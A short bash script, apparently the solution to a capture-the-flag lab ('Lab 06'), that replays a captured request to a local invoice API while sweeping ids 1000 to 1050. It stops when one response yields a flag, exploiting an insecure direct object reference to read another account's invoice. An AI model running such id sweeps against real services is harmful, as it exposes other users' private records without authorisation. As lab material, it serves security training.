#!/usr/bin/env bash
# Lab 06 — sweep the id space; the response names the owning account, so the
# outlier is visible without reading twenty bodies.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9060}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab06

"$H5I" browser open "$URL/api/invoice?id=1041" --session "$SESSION" --new --capture >/dev/null

for id in $(seq 1000 1050); do
    OUT="$(send "$SESSION" req_0 --reset-budget --set "query.id=$id" | flag)"
    [ "$OUT" != "no flag found" ] && { printf '%s\n' "$OUT"; exit 0; }
done
echo "no flag found"
